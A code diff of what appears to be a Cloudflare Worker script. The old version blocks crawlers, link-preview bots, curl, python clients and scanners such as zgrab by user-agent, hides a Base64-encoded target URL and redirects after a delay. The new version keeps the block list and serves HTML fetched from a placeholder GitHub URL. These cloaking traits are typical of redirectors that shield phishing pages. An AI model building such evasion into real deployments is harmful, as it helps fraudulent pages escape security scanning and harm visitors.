@@ -1,56 +1,30 @@
 export default {
   async fetch(request) {
-    const url = new URL(request.url);
     const userAgent = request.headers.get("User-Agent") || "";
 
-    // === BOT BLOCKING ===
-    const blockedBots = [
-      "bot", "crawler", "spider", "slurp", "scraper", "headless", "selenium",
-      "curl", "python", "requests", "http-client", "facebookexternalhit",
-      "whatsapp", "telegram", "discord", "zgrab", "semrush", "ahrefs", "mj12bot"
-    ];
-
+    // Bot blocking (same as before)
+    const blockedBots = ["bot", "crawler", "spider", /* ... rest of your list */];
     if (blockedBots.some(bot => userAgent.toLowerCase().includes(bot))) {
       return new Response("Access denied", { status: 403 });
     }
 
-    // === Target URL in Base64 ===
-    const targetBase64 = "aHR0cHM6Ly9teXNob3AuYXBw";   // https://myshop.app
-    const targetUrl = atob(targetBase64);
+    // Fetch HTML from GitHub
+    const htmlUrl = "https://raw.githubusercontent.com/YOUR-USERNAME/YOUR-REPO/main/index.html";
+    
+    try {
+      const response = await fetch(htmlUrl);
+      if (!response.ok) throw new Error("Failed to fetch HTML");
+      
+      let html = await response.text();
 
-    // === Clean HTML with embedded JS ===
-    const html = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            overflow: hidden;
-        }
-    </style>
-</head>
-<body>
-    <!-- JavaScript for redirect -->
-    <script>
-        // Redirect to target after 3 seconds
-        setTimeout(() => {
-            window.location.href = "${targetUrl}";
-        }, 3000);
-    </script>
-</body>
-</html>`;
-
-    return new Response(html, {
-      headers: {
-        "Content-Type": "text/html;charset=UTF-8",
-        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
-        "X-Robots-Tag": "noindex, nofollow"
-      },
-    });
+      return new Response(html, {
+        headers: {
+          "Content-Type": "text/html;charset=UTF-8",
+          "Cache-Control": "no-store, no-cache",
+        },
+      });
+    } catch (e) {
+      return new Response("Error loading page", { status: 500 });
+    }
   },
 };
